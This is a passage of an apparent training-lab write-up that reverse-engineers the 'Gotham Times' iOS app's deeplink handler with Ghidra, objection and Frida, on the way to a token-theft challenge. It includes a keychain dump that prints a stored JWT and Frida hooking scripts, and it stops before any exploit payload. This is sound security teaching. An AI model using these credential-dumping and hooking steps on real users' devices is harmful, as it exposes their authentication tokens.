---
title: Gotham Times - Mobile Hacking Lab
date: 2025-6-1 00:00:00 +/-TTTT
categories: [Mobile Hacking Lab]
tags: [mobile hacking lab, writeup, mobile penetration testing, ios]     # TAG names should always be lowercase
---



<br />

**Introduction**

Welcome to the **iOS Application Security Lab: Deeplink Exploitation Challenge**. The challenge is built around the fictional newspaper Gotham Times, an iOS application providing users with the latest news and updates about events happening in Gotham City. This challenge focuses on the potential vulnerabilities in the deep link feature, emphasizing how attackers can exploit it to gain unauthorized access to sensitive information, particularly authentication tokens. As an attacker, your goal is to craft an exploit that can be used to steal user's authentication token.

<br />

**Objective**

Craft a deeplink exploit to steal authentication token: Your task is to identify vulnerabilities in the deeplink implementation and create an exploit that, when triggered, steals the user's authentication token.

<br />

**Explore the app**

When you launch the app, you’ll see options to Register or Log in. Start by registering a new account, then log in.

<br />



![](/assets/img/mhl/GothamTimes/2.jpg)

<br />



![](/assets/img/mhl/GothamTimes/1.jpg)

<br />



After a successful login,the application opens the **Latest News**  screen displaying a collection of articles.

![](/assets/img/mhl/GothamTimes/4.jpg)



<br />

The **Profile** screen shows the currently logged-in user along with a **Log Out** button.

<br />

![](/assets/img/mhl/GothamTimes/6.jpg)





<br />

**Extracting the `.ipa` File**

The provided app came in an `.ipa` file essentially a ZIP archive containing the application bundle.

```
unzip com.mobilehackinglab.Gotham-Times.ipa.ipa
```

<br />

Inside the extracted folder, the binary was located in:

```
Payload/Gotham Times.app/Gotham Times
```

<br />

 examine the `Info.plist`

```json
└─# ipsw plist Info.plist
{
  "BuildMachineOSBuild": "23D60",
  "CFBundleDevelopmentRegion": "en",
  "CFBundleExecutable": "Gotham Times",
  "CFBundleIdentifier": "com.mobilehackinglab.Gotham-Times",
  "CFBundleInfoDictionaryVersion": "6.0",
  "CFBundleName": "Gotham Times",
  "CFBundlePackageType": "APPL",
  "CFBundleShortVersionString": "1.0",
  "CFBundleSupportedPlatforms": [
    "iPhoneOS"
  ],
  "CFBundleURLTypes": [
    {
      "CFBundleTypeRole": "Viewer",
      "CFBundleURLName": "com.mobilehackinglab.Gotham-Times",
      "CFBundleURLSchemes": [
        "gothamtimes"
      ]
    }
  ],
```

**custom URL scheme:**

- **CFBundleURLSchemes** → A list of URL schemes (like `https`, `mailto`, etc.) that your app registers.
- **"gothamtimes"** → The custom scheme name your app claims.

 With that in place, iOS will route any URL starting with `gothamtimes://` to your app instead of Safari or another app.

<br />

**Reverse Engineering with Ghidra**

<br />

The function `_ $s12Gotham_Times12saveJWTToken5tokenySS_tF` saves the user’s JWT token into the **keychain**.

![](/assets/img/mhl/GothamTimes/3.png)



<br />



![](/assets/img/mhl/GothamTimes/4.png)



<br />

We can confirm that the JWT token is stored by examining the data saved by the app using **objection**.

```
└─# objection -g com.mobilehackinglab.Gotham-Times.J8L462KYQ8 explore                 
Using USB device `iOS Device`
Agent injected and responds ok!

     _   _         _   _
 ___| |_|_|___ ___| |_|_|___ ___
| . | . | | -_|  _|  _| | . |   |
|___|___| |___|___|_| |_|___|_|_|
      |___|(object)inject(ion) v1.11.0

     Runtime Mobile Exploration
        by: @leonjza from @sensepost

[tab] for command suggestions
...inglab.Gotham-Times.J8L462KYQ8 on (iPhone: 16.0) [usb] # ios keychain dump
Note: You may be asked to authenticate using the devices passcode or TouchID
Save the output by adding `--json keychain.json` to this command
Dumping the iOS keychain...
Created                    Accessible                      ACL   Type      Account                                                    Service                                                           Data
-------------------------  ------------------------------  ----  --------  ---------------------------------------------------------  ----------------------------------------------------------------  -----------------------------------------------------------------------------------------------------------------------------------------------------------
2025-09-21 09:05:17 +0000  WhenUnlockedThisDeviceOnly      None  Password  JWTToken                                                                                                                     {"user":"Karim","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IkthcmltIiwiaWF0IjoxNzU4NDQ1NTE2fQ.bqOROl0yWQSbC_RASg5OVvTrSI9ip3XCn0E-zkPF03c"}
```

<br />



Using [this](https://github.com/Incognito-Lab/Frida-WebView-Inspector/blob/main/iOS_WebViews_inspector.js) Frida script, we can observe the URLs loaded by the WebView.

```javascript
//frida -U <ProcessName> -l iOS_WebViews_inspector.js
//This Frida script checks if the Webview class is available in the current process. If it is available, it proceeds to use Frida's `choose` method to enumerate all instances of the class, and for each instance it calls the `onMatch` function.
//After Webview classes instance is initialized, in Frida CLI, `%reload` should be used to reload this script.

if (ObjC.available) {

  //Check iOS Version
  function iOSVersionFunc() {
    var processInfo = ObjC.classes.NSProcessInfo.processInfo();
    var versionString = processInfo.operatingSystemVersionString().toString(); //E.g. Version 14.0 (Build XXXXX)
    var versionTemp = versionString.split(' ');
    var version = versionTemp[1]; //E.g. 14.0
    return version
  }

  function inspect_UIWebView(WebViewInstance) {
    console.log('URL: ', WebViewInstance.request().URL().toString());
  }

  function inspect_SFSafariViewController(SFSafariViewController) {
    //Do something;
  }

  function inspect_WKWebView(WebViewInstance) {
    console.log('URL: ', WebViewInstance.URL().toString());
    if (8.0 < iOSVersionFloat && iOSVersionFloat <= 14.0) {
      //WKWebView javaScriptEnabled deprecated after iOS 14.0
      console.log('javaScriptEnabled: ', WebViewInstance.configuration().preferences().javaScriptEnabled());
    } else if (iOSVersionFloat >= 14.1) {
      //WKWebView allowsContentJavaScript
      console.log('allowsContentJavaScript: ', WebViewInstance.configuration().defaultWebpagePreferences().allowsContentJavaScript());
    }
    console.log('allowFileAccessFromFileURLs: ', WebViewInstance.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
    console.log('hasOnlySecureContent: ', WebViewInstance.hasOnlySecureContent().toString());
    console.log('allowUniversalAccessFromFileURLs: ', WebViewInstance.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
  }

  var iOSVersionStr = iOSVersionFunc();
  var iOSVersionFloat = parseFloat(iOSVersionStr)

  var UIWebView = ObjC.classes.UIWebView;
  if (UIWebView) {
    console.log(`===== Found UIWebView =====`);
    ObjC.choose(UIWebView, {
      onMatch: function (WebViewInstance) {
        console.log('onMatch: ', WebViewInstance);
        inspect_UIWebView(WebViewInstance);
      },
      onComplete: function () {
        console.log('===== done for UIWebView! =====\n');
      }
    });
  }

  var WKWebView = ObjC.classes.WKWebView;
  if (WKWebView) {
    console.log(`===== Found WKWebView =====`);
    ObjC.choose(WKWebView, {
      onMatch: function (WebViewInstance) {
        console.log('onMatch: ', WebViewInstance);
        inspect_WKWebView(WebViewInstance);
      },
      onComplete: function () {
        console.log('===== done for WKWebView! =====\n');
      }
    });
  }

  var SFSafariViewController = ObjC.classes.SFSafariViewController;
  if (SFSafariViewController) {
    console.log(`===== Found SFSafariViewController =====`);
    ObjC.choose(SFSafariViewController, {
      onMatch: function (WebViewInstance) {
        console.log('onMatch: ', WebViewInstance);
        //inspect_SFSafariViewController(WebViewInstance);
      },
      onComplete: function () {
        console.log('===== done for SFSafariViewController! =====\n');
      }
    });
  }

  //Check if application use JavaScript Bridge (**Not tested yet**)
  //WKUserContentController
  var WKUserContentController = ObjC.classes.WKUserContentController;
  if (WKUserContentController) {
    Interceptor.attach(WKUserContentController['- addScriptMessageHandler:name:'].implementation, {
      onEnter: function (args) {
        console.log("===== Check if application use JavaScript Bridge (WKUserContentController) =====");
        console.log(`\nClasss: \'WKUserContentController\' Method: \'- addScriptMessageHandler:name:\' Called`);
        var handler = new ObjC.Object(args[2]);
        var name = new ObjC.Object(args[3]);
        console.log(name, '->', handler.$className);
      }
    });
  }

  //WebViewJavascriptBridge
  var WebViewJavascriptBridge = ObjC.classes.WebViewJavascriptBridge;
  if (WebViewJavascriptBridge) {
    Interceptor.attach(WebViewJavascriptBridge['- registerHandler:handler:'].implementation, {
      onEnter: function (args) {
        console.log("===== Check if application use JavaScript Bridge (WebViewJavascriptBridge) =====");
        console.log(`\nClasss: \'WebViewJavascriptBridge\' Method: \'- registerHandler:handler:\' Called`);
        var name = new ObjC.Object(args[2].toString());
        console.log(name, '->', handler.$className);
        //var handler = new ObjC.Object();
      }
    });
  }

  /*
    //Used to inspectloadHTMLString on WKWebView
    var WebViewClassName = "WKWebView"
    var methodName = "- loadHTMLString:baseURL:";
    var methodAddr = ObjC.classes[WebViewClassName][methodName].implementation;
    Interceptor.attach(methodAddr, {
      onEnter: function (args) {
        console.log(`\n======================================================================`);
        console.log(`Classs: \'${WebViewClassName}\' Method: \'${methodName}\' Called`);
        console.log(`HTML string: ${new ObjC.Object(ptr(args[2])).toString()}`);
        console.log(`Base URL: ${args[3].toString()}`);
      },
      onLeave: function (returnVal) {
        console.log(`Return Value: ${returnVal}`);
      }
    });
    */

}
```

output

```
[iOS Device::com.mobilehackinglab.Gotham-Times.J8L462KYQ8 ]-> 
===== Found UIWebView =====
===== done for UIWebView! =====

===== Found WKWebView =====
onMatch:  <WKWebView: 0x1088f3000; frame = (0 0; 375 812); layer = <CALayer: 0x2838367a0>>
URL:  https://mhl.pages.dev/gotham-times/news
allowsContentJavaScript:  true
allowFileAccessFromFileURLs:  0
hasOnlySecureContent:  true
allowUniversalAccessFromFileURLs:  0
===== done for WKWebView! =====
```



<br /><br />



A Frida script that lists the app’s classes

```javascript
for (var className in ObjC.classes) {
    if (ObjC.classes.hasOwnProperty(className)) {
        if (className.toLowerCase().indexOf("gotham") !== -1) {
            console.log(className);
        }
    }
}
```

output

```
Spawning `com.mobilehackinglab.Gotham-Times.J8L462KYQ8`...              
_TtC12Gotham_TimesP33_20111BBAEF567C31D42C41CC9CCB0B0919ResourceBundleClass
Gotham_Times.SceneDelegate
Gotham_Times.AppDelegate
Gotham_Times.LoginController
Gotham_Times.SignupController
Gotham_Times.ViewController
Gotham_Times.NewsController
Gotham_Times.ProfileController
```

<br />



The method `_ $s12Gotham_Times13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16UIOpenURLContextCGtF` is responsible for handling deep link URL openings.

```c
void _$s12Gotham_Times13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16UIOpenURLContextCGtF
               (undefined8 *param_1,undefined8 param_2)

{
  puVar5 = PTR__swift_isaMask_100028640;
  plVar1 = (long *)(PTR__$sypN_100028708 + 8);
  local_78 = (undefined8 *)0x0;
  _memset(auStack_a0,0,0x28);
  local_b0 = 0;
  local_e0 = 0;
  local_d8 = 0;
  local_108 = (ulong *)0x0;
  local_110 = (ulong *)0x0;
  local_118 = (ulong *)0x0;
  local_130 = (ulong *)0x0;
  lVar8 = 0;
  _$s10Foundation3URLVMa();
  lVar17 = *(long *)(lVar8 + -8);
  lVar18 = *(long *)(lVar17 + 0x40);
  (*(code *)PTR____chkstk_darwin_1000281f0)();
  lVar18 = (long)&local_390 - (lVar18 + 0xfU & 0xfffffffffffffff0);
  (*(code *)PTR____chkstk_darwin_1000281f0)();
  lVar2 = lVar18 - (extraout_x8 + 0xfU & 0xfffffffffffffff0);
  (*(code *)PTR____chkstk_darwin_1000281f0)();
  lVar3 = lVar2 - (extraout_x8_00 + 0xfU & 0xfffffffffffffff0);
  (*(code *)PTR____chkstk_darwin_1000281f0)();
  lVar4 = lVar3 - (extraout_x8_01 + 0xfU & 0xfffffffffffffff0);
  _objc_retain();
  puVar9 = &_OBJC_CLASS_$_UIWindowScene;
  _objc_opt_self(&_OBJC_CLASS_$_UIWindowScene);
  puVar13 = param_1;
  _swift_dynamicCastObjCClass(param_1,puVar9);
  local_1e0 = puVar13;
  if (puVar13 == (undefined8 *)0x0) {
    local_1e8 = (undefined8 *)0x0;
    _objc_release(param_1);
    local_1e0 = local_1e8;
  }
  local_1f0 = local_1e0;
  if (local_1e0 != (undefined8 *)0x0) {
    local_1f8 = local_1e0;
    local_210 = local_1e0;
    local_78 = local_1e0;
    _swift_bridgeObjectRetain(param_2);
    auVar19 = _$sSo16UIOpenURLContextCMa();
    local_208 = auVar19._0_8_;
    puVar9 = _$sSo16UIOpenURLContextCSo8NSObjectCSH10ObjectiveCWl();
    local_200 = auStack_58;
    _$sSh12makeIteratorSh0B0Vyx_GyF(param_2,local_208,puVar9);
    _memcpy(auStack_a0,local_200,0x28);
    while( true ) {
      ___swift_instantiateConcreteTypeFromMangledName
                ((long *)&_$sSh8IteratorVySo16UIOpenURLContextC_GMD);
      _$sSh8IteratorV4nextxSgyF(&local_a8);
      local_218 = local_a8;
      if (local_a8 == 0) break;
      local_220 = local_a8;
      local_260 = local_a8;
      local_b0 = local_a8;
      uVar10 = 1;
      plVar11 = plVar1;
      _$ss27_allocateUninitializedArrayySayxG_BptBwlF();
      local_268 = &objc::protocol_t::WKUIDelegate;
      pcVar14 = "URL";
      lVar16 = local_260;
      local_2a0 = plVar11;
      local_298 = uVar10;
      _objc_msgSend();
      _objc_retainAutoreleasedReturnValue();
      local_290 = lVar16;
      _$s10Foundation3URLV36_unconditionallyBridgeFromObjectiveCyACSo5NSURLCSgFZ(lVar4);
      local_2a0[3] = lVar8;
      plVar11 = ___swift_allocate_boxed_opaque_existential_0(local_2a0,(long *)pcVar14);
      (**(code **)(lVar17 + 0x20))(plVar11,lVar4,lVar8);
      uVar10 = _$ss27_finalizeUninitializedArrayySayxGABnlF(local_298);
      lVar16 = local_290;
      local_270 = uVar10;
      _objc_release();
      _$ss5print_9separator10terminatoryypd_S2StFfA0_();
      local_288 = lVar16;
      local_278 = uVar10;
      _$ss5print_9separator10terminatoryypd_S2StFfA1_();
      local_280 = uVar10;
      _$ss5print_9separator10terminatoryypd_S2StF(local_270,local_288,local_278,lVar16);
      _swift_bridgeObjectRelease(local_280);
      _swift_bridgeObjectRelease(local_278);
      _swift_bridgeObjectRelease(local_270);
      lVar16 = local_260;
      _objc_msgSend(local_260,local_268[0x2e].instanceProperties);
      _objc_retainAutoreleasedReturnValue();
      local_258 = lVar16;
      _$s10Foundation3URLV36_unconditionallyBridgeFromObjectiveCyACSo5NSURLCSgFZ(lVar3);
      local_250 = *(code **)(lVar17 + 0x10);
      lVar16 = lVar2;
      lVar15 = lVar3;
      (*local_250)(lVar2,lVar3,lVar8);
      _$s10Foundation3URLV4hostSSSgvg();
      local_248 = *(code **)(lVar17 + 8);
      local_238 = lVar16;
      local_230 = lVar15;
      (*local_248)(lVar2,lVar8);
      (*local_248)(lVar3,lVar8);
      _swift_bridgeObjectRetain(local_230);
      pcVar14 = "open";
      lVar16 = 4;
      _$sSS21_builtinStringLiteral17utf8CodeUnitCount7isASCIISSBp_BwBi1_tcfC("open",4,1);
      local_240 = pcVar14;
      local_228 = lVar16;
      _swift_bridgeObjectRetain();
      local_d0 = local_238;
      local_c8 = local_230;
      local_c0 = local_240;
      local_b8 = local_228;
      if (local_230 == 0) {
        if (local_228 != 0) goto LAB_1000195a4;
        _$sSSSgWOh((long)&local_d0);
        local_2a4 = 1;
      }
      else {
        _$sSSSgWOc(&local_d0,&local_140);
        if (local_b8 == 0) {
          _$sSSWOh((long)&local_140);
LAB_1000195a4:
          _$sSSSg_AAtWOh((long)&local_d0);
          local_2a4 = 0;
        }
        else {
          local_2d0 = local_140;
          local_2b8 = local_138;
          _swift_bridgeObjectRetain();
          local_2c8 = local_c0;
          local_2b0 = &local_d0;
          local_2c0 = local_b8;
          _swift_bridgeObjectRetain();
          uVar10 = local_2d0;
          _$sSS2eeoiySbSS_SStFZ(local_2d0,local_2b8,local_2c8,local_2c0);
          local_2a8 = (uint)uVar10;
          _swift_bridgeObjectRelease(local_2c0);
          _swift_bridgeObjectRelease(local_2b8);
          _swift_bridgeObjectRelease(local_2c0);
          _swift_bridgeObjectRelease(local_2b8);
          _$sSSSgWOh((long)local_2b0);
          local_2a4 = local_2a8;
        }
      }
      local_2d4 = local_2a4;
      _swift_bridgeObjectRelease(local_228);
      _swift_bridgeObjectRelease(local_230);
      _objc_release(local_258);
      if ((local_2d4 & 1) != 0) {
        lVar16 = local_260;
        _objc_msgSend(local_260,"URL");
        _objc_retainAutoreleasedReturnValue();
        local_2f0 = lVar16;
        _$s10Foundation3URLV36_unconditionallyBridgeFromObjectiveCyACSo5NSURLCSgFZ(lVar4);
        lVar16 = lVar18;
        lVar15 = lVar4;
        (*local_250)(lVar18,lVar4,lVar8);
        _$s10Foundation3URLV14absoluteStringSSvg();
        local_308 = lVar16;
        local_2f8 = lVar15;
        (*local_248)(lVar18,lVar8);
        (*local_248)(lVar4,lVar8);
        pcVar14 = "url";
        uVar10 = 3;
        _$sSS21_builtinStringLiteral17utf8CodeUnitCount7isASCIISSBp_BwBi1_tcfC("url",3,1);
        lVar16 = local_308;
        lVar15 = local_2f8;
        local_300 = uVar10;
        (**(code **)((*unaff_x20 & *(ulong *)puVar5) + 0x78))(local_308,local_2f8,pcVar14);
        local_2e8 = lVar16;
        local_2e0 = lVar15;
        _swift_bridgeObjectRelease(local_300);
        _swift_bridgeObjectRelease(local_2f8);
        _objc_release(local_2f0);
        local_e0 = local_2e8;
        local_d8 = local_2e0;
        local_f0 = local_2e8;
        local_e8 = local_2e0;
        _$sSSSgWOc(&local_f0,&uStack_100);
        bVar7 = local_f8 != 0;
        if (bVar7) {
          _$sSSSgWOh((long)&uStack_100);
        }
        local_30c = (uint)bVar7;
        if (local_30c != 0) {
          local_320 = 0;
          _$sSo12UIStoryboardCMa();
          pcVar14 = "Main";
          uVar10 = 4;
          local_34c = 1;
          _$sSS21_builtinStringLiteral17utf8CodeUnitCount7isASCIISSBp_BwBi1_tcfC("Main",4,1);
          local_340 = (ulong *)_$sSo12UIStoryboardC4name6bundleABSS_So8NSBundleCSgtcfCTO
                                         (pcVar14,uVar10,local_320);
          pcVar14 = "TabbedControllerID";
          uVar10 = 0x12;
          local_108 = local_340;
          _$sSS21_builtinStringLiteral17utf8CodeUnitCount7isASCIISSBp_BwBi1_tcfC
                    ("TabbedControllerID",0x12,local_34c & 1);
          local_348 = uVar10;
          _$sSS10FoundationE19_bridgeToObjectiveCSo8NSStringCyF();
          local_338 = pcVar14;
          _swift_bridgeObjectRelease(local_348);
          puVar12 = local_340;
          _objc_msgSend(local_340,"instantiateViewControllerWithIdentifier:",local_338);
          _objc_retainAutoreleasedReturnValue();
          local_330 = puVar12;
          _objc_release(local_338);
          puVar9 = &_OBJC_CLASS_$_UITabBarController;
          _objc_opt_self(&_OBJC_CLASS_$_UITabBarController);
          puVar12 = local_330;
          _swift_dynamicCastObjCClassUnconditional(local_330,puVar9,0,0);
          local_328 = puVar12;
          local_110 = puVar12;
          _objc_msgSend();
          auVar19 = _$sSo22UINavigationControllerCMa();
          _objc_retain(local_328,auVar19._8_8_);
          puVar12 = local_328;
          _$sSo22UINavigationControllerC08rootViewB0ABSo06UIViewB0C_tcfC(local_328);
          local_318 = puVar12;
          local_118 = puVar12;
          auVar19 = _$sSo8UIWindowCMa();
          _objc_retain(local_210,auVar19._8_8_);
          puVar13 = local_210;
          _$sSo8UIWindowC11windowSceneABSo0aC0C_tcfC(local_210);
          (**(code **)((*unaff_x20 & *(ulong *)puVar5) + 0x60))();
          (**(code **)((*unaff_x20 & *(ulong *)puVar5) + 0x58))();
          local_120 = puVar13;
          if (puVar13 == (undefined8 *)0x0) {
            puVar13 = _$sSo8UIWindowCSgWOh(&local_120);
          }
          else {
            local_360 = &local_120;
            local_358 = puVar13;
            _objc_retain();
            _$sSo8UIWindowCSgWOh(local_360);
            _objc_retain(local_318);
            _objc_msgSend(local_358,"setRootViewController:",local_318);
            _objc_release(local_318);
            puVar13 = local_358;
            _objc_release();
          }
          (**(code **)((*unaff_x20 & *(ulong *)puVar5) + 0x58))();
          local_128 = puVar13;
          if (puVar13 == (undefined8 *)0x0) {
            _$sSo8UIWindowCSgWOh(&local_128);
          }
          else {
            local_370 = &local_128;
            local_368 = puVar13;
            _objc_retain();
            _$sSo8UIWindowCSgWOh(local_370);
            _objc_msgSend(local_368,"makeKeyAndVisible");
            _objc_release(local_368);
          }
          puVar12 = local_328;
          _objc_msgSend(local_328,"selectedViewController");
          _objc_retainAutoreleasedReturnValue();
          local_378 = puVar12;
          if (puVar12 == (ulong *)0x0) {
            *(undefined1 *)(lVar4 + -0x20) = 2;
            *(undefined8 *)(lVar4 + -0x18) = 0x2b;
            *(undefined4 *)(lVar4 + -0x10) = 0;
            _$ss17_assertionFailure__4file4line5flagss5NeverOs12StaticStringV_A2HSus6UInt32VtF
                      ("Fatal error",0xb,2,
                       "Unexpectedly found nil while unwrapping an Optional value",0x39,2,
                       "Gotham_Times/SceneDelegate.swift",0x20);
                    /* WARNING: Does not return */
            pcVar6 = (code *)SoftwareBreakpoint(1,0x1000199cc);
            (*pcVar6)();
          }
          uVar10 = 0;
          local_390 = puVar12;
          local_380 = puVar12;
          _$s12Gotham_Times14NewsControllerCMa();
          puVar12 = local_390;
          _swift_dynamicCastClassUnconditional(local_390,uVar10,0,0);
          local_388 = puVar12;
          local_130 = puVar12;
          _swift_bridgeObjectRetain(local_2e0);
          (**(code **)((*puVar12 & *(ulong *)puVar5) + 0x88))(local_2e8,local_2e0);
          (**(code **)((*local_388 & *(ulong *)puVar5) + 0xa0))();
          _objc_release(local_388);
          _objc_release(local_318);
          _objc_release(local_328);
          _objc_release(local_340);
        }
        _swift_bridgeObjectRelease(local_2e0);
      }
      _objc_release(local_260);
    }
    _$sSh8IteratorVySo16UIOpenURLContextC_GWOh(auStack_a0);
    _objc_release(local_210);
  }
  return;
}
```



<br />

This method invokes `SceneDelegate.scene(param_3)`. Within this routine, the application processes the structure of the deep link. It extracts the host portion of the URL and validates that it matches `open` (e.g., `gothamtimes://open`). Next, it inspects the query string to confirm the presence of the `url` key, resulting in a link such as `gothamtimes://open?url=https://google.com`.

<br />

![](/assets/img/mhl/GothamTimes/1.png)



<br />

![](/assets/img/mhl/GothamTimes/2.png)

<br />

Example: 

```
gothamtimes://open?url=https://google.com
```

<br />

1. The application is opened via the deep link.
2. The host value is checked to confirm it equals `open`.
3. The presence of a `url` parameter is verified.
4. The `url` parameter is parsed, and the corresponding page is rendered in a WebView.

<br />

![](/assets/img/mhl/GothamTimes/5.jpg)





<br />

![](/assets/img/mhl/GothamTimes/3.jpg)



<br />

The Frida script hooks into the `Gotham_Times.SceneDelegate` method `- scene:openURLContexts:` in order to monitor when the app handles **deep links**.

````javascript
if (!ObjC.available) {
    console.log("Objective-C runtime not available!");
    throw "ObjC required";
}

// Target class and selector
var className = "Gotham_Times.SceneDelegate";
var selector = "- scene:openURLContexts:";

// --- helpers ---
function safe(fn) {
    try { return fn(); } catch (e) { return null; }
}

function ptrToString(p) {
    try { return ptr(p).toString(); } catch (e) { return String(p); }
}

function valueToString(val) {
    if (val === null || val === undefined) return "<null>";
    // If it's already a JS string
    if (typeof val === "string") return val;
    // Try wrapping as ObjC object
    try {
        var o = ObjC.Object(val);
        if (!o) return "<null-obj>";
        var cls = safe(() => o.$className) || "<unknown-class>";

        // NSURL special-case
        if (cls.indexOf("NSURL") !== -1 || cls === "NSURL") {
            try {
                var abs = o.absoluteString();
                return "[" + cls + "] " + abs.toString();
            } catch (e) {}
        }

        // NSString
        if (cls === "NSString" || cls.indexOf("CFString") !== -1) {
            try { return "[" + cls + "] " + o.toString(); } catch (e) {}
        }

        // NSData try printable
        if (cls === "NSData") {
            try {
                var s = ObjC.classes.NSString.alloc().initWithData_encoding_(o, 4);
                return "[NSData len=" + o.length() + "] utf8: " + s.toString();
            } catch (e) {
                try {
                    var len = o.length();
                    var bytes = Memory.readByteArray(o.bytes(), Math.min(64, len));
                    var hex = Array.from(new Uint8Array(bytes)).map(b => ('0' + b.toString(16)).slice(-2)).join('');
                    return "[NSData len=" + len + "] hex_preview: " + hex;
                } catch (ee) {}
            }
        }

        // NSDictionary / NSArray printing
        if (cls === "NSDictionary" || cls === "NSMutableDictionary") {
            return dictToString(o);
        }
        if (cls === "NSArray" || cls === "NSMutableArray" || cls.indexOf("Array") !== -1) {
            try {
                var arr = [];
                var cnt = safe(()=> o.count && o.count()) || 0;
                for (var i = 0; i < cnt; i++) {
                    try { arr.push(valueToString(o.objectAtIndex_(i))); } catch (e) { arr.push("<err>"); }
                }
                return "[" + cls + "] " + JSON.stringify(arr);
            } catch (e) {}
        }

        // default: use toString()
        try { return "[" + cls + "] " + o.toString(); } catch (e) { return "[" + cls + "]"; }
    } catch (e) {
        // not an ObjC object — try C string
    }

    // try C string
    try {
        var s = Memory.readUtf8String(ptr(val));
        if (s !== null && s !== undefined) return "[c-string] " + s;
    } catch (e) {}

    return String(val);
}

function dictToString(dict) {
    try {
        var keys = dict.allKeys();
        var n = keys.count();
        var lines = ["{"];
        for (var i = 0; i < n; i++) {
            var k = safe(()=> keys.objectAtIndex_(i));
            var v = safe(()=> dict.objectForKey_(k));
            var ks = valueToString(k);
            var vs = valueToString(v);
            lines.push("  " + ks + ": " + vs);
        }
        lines.push("}");
        return lines.join("\n");
    } catch (e) {
        return "[NSDictionary unreadable: " + e.message + "]";
    }
}

// Print contents of a UIOpenURLContext set (NSSet)
function printOpenURLContexts(setObj) {
    if (!setObj) {
        console.log("  openURLContexts: <null>");
        return;
    }
    // NSSet -> get allObjects() to iterate as NSArray
    var arr = null;
    try {
        if (setObj.allObjects) {
            arr = safe(() => setObj.allObjects());
        } else if (setObj.toArray) {
            arr = safe(() => setObj.toArray());
        }
    } catch (e) {
        arr = null;
    }

    if (!arr) {
        // maybe it's already an NSArray-like object, try treating as enumerable
        try {
            var cnt = safe(() => setObj.count && setObj.count()) || 0;
            console.log("  openURLContexts (count: " + cnt + "):");
            for (var i = 0; i < cnt; i++) {
                var item = safe(() => setObj.allObjects().objectAtIndex_(i));
                printOneOpenURLContext(item, i);
            }
            return;
        } catch (e) {
            console.log("  openURLContexts: <cannot iterate: " + e.message + ">");
            return;
        }
    }

    var count = safe(() => arr.count && arr.count()) || 0;
    console.log("  openURLContexts (count: " + count + "):");
    for (var i = 0; i < count; i++) {
        var ctx = safe(() => arr.objectAtIndex_(i));
        printOneOpenURLContext(ctx, i);
    }
}

function printOneOpenURLContext(ctx, index) {
    if (!ctx) {
        console.log("   [" + index + "] <null>");
        return;
    }
    var cls = safe(() => ctx.$className) || "<unknown>";
    // Many versions expose .URL or .url, try both
    var urlStr = null;
    try {
        if (typeof ctx.URL === "function") {
            urlStr = safe(() => ctx.URL().absoluteString().toString());
        } else if (ctx.respondsToSelector_ && ctx.respondsToSelector_("URL")) {
            urlStr = safe(() => ctx.URL().absoluteString().toString());
        } else if (ctx.respondsToSelector_ && ctx.respondsToSelector_("url")) {
            urlStr = safe(() => ctx.url().absoluteString().toString());
        } else {
            // try property access
            urlStr = safe(() => ctx.url && ctx.url().absoluteString().toString());
        }
    } catch (e) {
        urlStr = null;
    }

    // fallback: try toString() on ctx
    var desc = safe(() => ctx.toString && ctx.toString().toString());
    console.log("   [" + index + "] " + cls + " => URL:", urlStr ? urlStr : "<unknown>", "| desc:", desc ? desc : "<no-desc>");

    // try printing options dictionary if present (some contexts may have options)
    try {
        if (ctx.options) {
            var opts = safe(()=> ctx.options());
            if (opts) {
                console.log("        options: " + valueToString(opts));
            }
        }
    } catch (e) {}
}

// --- main: find and hook the method ---
if (!ObjC.classes[className]) {
    console.log("Class not found:", className);
    throw "Class not found";
}

var cls = ObjC.classes[className];
if (!cls[selector]) {
    console.log("Selector not found on class:", selector);
    // Try variant without module prefix (just in case)
    throw "Selector not found";
}

try {
    var impl = cls[selector].implementation;
    console.log("Hooking", className, selector, "-> implementation:", impl);

    Interceptor.attach(impl, {
        onEnter: function (args) {
            // args[0] = self, args[1] = _cmd, args[2] = UIScene*, args[3] = NSSet<UIOpenURLContext>*
            console.log("\n[+] " + className + " " + selector + " called");

            // self
            try {
                var selfObj = ObjC.Object(args[0]);
                console.log(" self:", "[" + (selfObj.$className || "<no-class>") + "] " + safe(()=> selfObj.toString && selfObj.toString().toString()));
            } catch (e) {
                console.log(" self: <cannot read self: " + e.message + ">");
            }

            // scene (arg index 2)
            try {
                var sceneObj = ObjC.Object(args[2]);
                console.log(" scene:", valueToString(sceneObj));
            } catch (e) {
                // fallback: raw pointer
                console.log(" scene: <cannot read: " + e.message + ">", ptrToString(args[2]));
            }

            // openURLContexts (arg index 3)
            try {
                var contexts = ObjC.Object(args[3]);
                printOpenURLContexts(contexts);
            } catch (e) {
                console.log(" openURLContexts: <cannot read: " + e.message + ">", ptrToString(args[3]));
            }
        },
        onLeave: function (retval) {
            // nothing special to do for return
            try { console.log(" [-] returned:", valueToString(retval)); } catch (e) {}
        }
    });

    console.log("Hook installed for", className, selector);
} catch (err) {
    console.log("Failed to hook:", err.message || err);
}
````

<br />

output

```
Spawning `com.mobilehackinglab.Gotham-Times.J8L462KYQ8`...              
Hooking Gotham_Times.SceneDelegate - scene:openURLContexts: -> implementation: 0x104149d88
Hook installed for Gotham_Times.SceneDelegate - scene:openURLContexts:
Spawned `com.mobilehackinglab.Gotham-Times.J8L462KYQ8`. Resuming main thread!
[iOS Device::com.mobilehackinglab.Gotham-Times.J8L462KYQ8 ]->
[+] Gotham_Times.SceneDelegate - scene:openURLContexts: called
 self: [Gotham_Times.SceneDelegate] <Gotham_Times.SceneDelegate: 0x280420ba0>
 scene: [UIWindowScene] <UIWindowScene: 0x1066063e0; role: UIWindowSceneSessionRoleApplication; persistentIdentifier: 04EAB7E8-1819-4E9B-BC75-C6342395CE82; activationState: UISceneActivationStateForegroundInactive>
  openURLContexts (count: 1):
   [0] UIOpenURLContext => URL: gothamtimes://open?url=https://google.com | desc: <UIOpenURLContext: 0x280404f20; URL: gothamtimes://open?url=https://google.com; options: <UISceneOpenURLOptions: 0x281104a00; sourceApp: (null); annotation: (null); openInPlace: NO; _eventAttribution: (null)>>
        options: [UISceneOpenURLOptions] <UISceneOpenURLOptions: 0x281104a00; sourceApp: (null); annotation: (null); openInPlace: NO; _eventAttribution: (null)>
